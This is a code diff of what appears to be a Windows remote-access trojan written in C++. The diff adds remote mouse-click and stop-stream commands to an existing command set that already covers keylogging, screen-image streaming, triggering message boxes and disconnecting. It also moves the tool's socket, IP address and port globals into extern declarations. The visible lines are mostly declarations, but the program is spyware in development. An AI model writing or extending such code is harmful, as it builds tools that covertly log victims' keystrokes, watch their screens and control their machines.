@@ -1,3 +1,4 @@
+#define _WIN32_WINNT 0x0500
 #include <iostream>
 #include <stdlib.h>
 #include <winsock2.h>
@@ -33,34 +34,35 @@ using std::map;
 using std::stringstream;
 
 //enumerate server messages so we can process them!
-enum SERVERMESSAGE {TRIGMSGBOX, KEYLOG, STOPKEYLOG,DISCONNECT, STREAMPICT}; //ENUMERATE SERVER COMMANDS, 0 = MESSAGE1, 1 = MESSAGE2
+enum SERVERMESSAGE {TRIGMSGBOX, KEYLOG, STOPKEYLOG,DISCONNECT, STREAMPICT, MOVMOUSECLK, STOPSTREAM}; //ENUMERATE SERVER COMMANDS, 0 = MESSAGE1, 1 = MESSAGE2
 
-//map the c-style strings to each enumeration or UINT type for our messageboxes.
-map<string, SERVERMESSAGE> dictionary;
-map<string, UINT> MSGBOX_TYPES;
-map<string, UINT> MSGBOX_ICONS;
+//map the c-style strings to each enumeration or UINT type for our fes.
+extern map<string, SERVERMESSAGE> dictionary;
+extern map<string, UINT> MSGBOX_TYPES;
+extern map<string, UINT> MSGBOX_ICONS;
 
 const int buffersize = 5000;
 
-unsigned int KEYLOG_ID;
+extern unsigned int KEYLOG_ID;
 
-string server_operator;
-string server_operand;
-string ipaddress = IP_ADDR;
+extern string server_operator;
+extern string server_operand;
+extern string ipaddress;
 
 
-int portnumber = PORTNO;
+extern int portnumber;
 
-WSADATA wsa;
-SOCKET sa, clientsock;
-struct sockaddr_in server, client;
-char server_reply[buffersize];
+extern WSADATA wsa;
+extern SOCKET sa, clientsock;
+extern struct sockaddr_in server, client;
+extern char server_reply[buffersize];
 //THIS BOOLEAN VALUE WILL MAKE THE SERVER KEEP WORKING. CAN BE DISABLED FROM CLIENT.
-bool KILLSERVER = true;
+extern bool KILLSERVER , stream_is_true ;
 
 typedef struct IMAGE_PKT_HEADER{
 
     //make sure to ntohl the ints.
+    int screen_ratio;
     BITMAPINFOHEADER bitmaphdr;
     int packet_expected;
     int origx, origy;
